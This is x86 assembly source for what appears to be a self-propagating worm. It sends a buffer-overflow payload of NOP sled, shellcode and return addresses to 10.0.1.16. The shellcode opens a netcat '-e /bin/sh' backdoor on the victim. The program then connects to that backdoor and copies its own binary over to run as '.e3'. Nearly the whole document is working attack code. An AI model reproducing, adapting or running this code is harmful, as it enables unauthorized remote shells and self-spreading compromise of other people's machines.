  ;stack model
  ;
  ;====================================================================================
  ;| stack is same as that of freshly opened host >> top: argc, argv[0], argv[1], ... |
  ;====================================================================================
  ;

	;%esi = socket(af_inet,sock_stream,tcp)
	push dword 6
	push dword 1
	push dword 2
	call _socket
	mov esi,eax

	;connect(%esi,&{af_inet,10.0.1.16:43468,zero},16)
	push dword 0
	push dword 0
	push 0x1001000a
	push word 0xcca9
	push word 2
	mov edi,esp
	push dword 16
	push edi
	push esi
	call _connect

	;create space on stack for exploit
	sub esp,512
	mov ecx,esp

	;copy 114 bytes of NOP
	mov edx,114
__copypad:
	cmp edx,0
	je __exitcopypad
	mov byte[ecx],0x90
	inc ecx
	dec edx
	jmp __copypad

	;copy 114 bytes of exploit
__exitcopypad:
	mov edx,114
	jmp __EXP__
  X__EXP__:
	pop edi
__copyexploit:
	cmp edx,0
	je __exitcopyexploit
	mov bl,byte[edi]
	mov byte[ecx],bl
	inc ecx
	inc edi
	dec edx
	jmp __copyexploit

	;copy 32 bytes of address
__exitcopyexploit:
	mov edx,8
__copyretaddr:
	cmp edx,0
	je __exitcopyretaddr
	mov dword [ecx],0xbffff9b9
	add ecx,4
	dec edx
	jmp __copyretaddr

	;pad with 4 bytes of NULLs
__exitcopyretaddr:
	mov dword [ecx],0

	;writing the exploit to socket
	;write(%esi,%esp,512)
	mov eax,4
	mov ebx,esi
	mov ecx,esp
	mov edx,512
	int 0x80

	;clearing stack
	add esp,512

	;close(%esi)
	mov eax,6
	int 0x80

	;server pwned
	;backdoor setup on remote machine

	;sleep(5)
	push dword 0
	push dword 5
	mov eax,162
	mov ebx,esp
	mov ecx,0
	int 0x80
	pop ecx
	pop ecx

	;%esi=socket(af_inet,sock_stream,tcp)
	push dword 6
	push dword 1
	push dword 2
	call _socket
	mov esi,eax

	;connect(%esi,&{af_inet,10.0.1.16:43469,zero},16)
	push dword 0
	push dword 0
	push 0x1001000a
	push word 0xcda9
	push word 2
	mov edi,esp
	push dword 16
	push edi
	push esi
	call _connect

	;connected to backdoor

	;create pipe to file
	mov eax,4
	mov ebx,esi
	jmp __CMD__
  X__CMD__:
	pop ecx
	mov edx,48
	int 0x80

	;%edi=open(host,"r")
	pop ebx
	pop ebx
	mov eax,5
	mov ecx,0
	mov edx,0
	int 0x80
	mov edi,eax

	;creating space on stack for buf
	sub esp,512
	mov edx,512

__xferself:
	;sleep(2)
	push dword 0
	push dword 2
	mov eax,162
	mov ebx,esp
	mov ecx,0
	int 0x80
	add esp,8

	;read from host
	;read(%edi,%esp,512)
	mov ecx,esp
	mov eax,3
	mov ebx,edi
	int 0x80

	cmp eax,512
	jl __xferlastsector

	;write to socket
	;write(%esi,%esp,%edx)
	mov eax,4
	mov ebx,esi
	int 0x80
	jmp __xferself
__xferlastsector:
	mov edx,eax
	mov ebx,esi
	mov eax,4
	int 0x80

	add esp,512

	;close(%edi)
	mov ebx,edi
	mov eax,6
	int 0x80

	;sleep(2)
	mov eax,162
	push dword 0
	push dword 2
	mov ebx,esp
	mov ecx,0
	int 0x80
	add esp,8

	;close(%esi)
	mov ebx,esi
	mov eax,6
	int 0x80

	jmp __exit_jumper

	;strings
  __EXP__:
	call X__EXP__
	db 0x90,0x31,0xc0,0xb0,0x0b,0x31,0xd2,0x52,0xeb,0x5b
	db 0x8b,0x1c,0x24,0x88,0x53,0x07,0xeb,0x4b,0x8b,0x1c,0x24
	db 0x88,0x53,0x02,0xeb,0x38,0x8b,0x1c,0x24,0x88,0x53,0x05
	db 0xeb,0x27,0x8b,0x1c,0x24,0x88,0x53,0x03,0xeb,0x0a,0x8b
	db 0x1c,0x24,0x88,0x53,0x0f,0x89,0xe1,0xcd,0x80,0xe8,0xf1
	db 0xff,0xff,0xff,0x2f,0x75,0x73,0x72,0x2f,0x62,0x69,0x6e
	db 0x2f,0x6e,0x65,0x74,0x63,0x61,0x74,0x01,0xe8,0xd4,0xff
	db 0xff,0xff,0x2d,0x6c,0x70,0x01,0xe8,0xc3,0xff,0xff,0xff
	db 0x34,0x33,0x34,0x36,0x39,0x01,0xe8,0xb0,0xff,0xff,0xff
	db 0x2d,0x65,0x01,0xe8,0xa0,0xff,0xff,0xff,0x2f,0x62,0x69
	db 0x6e,0x2f,0x73,0x68,0x01

  __CMD__:
	call X__CMD__
	db "touch .e3; chmod a+x .e3; cat > .e3; exec ./.e3",10

__exit_jumper:
	nop
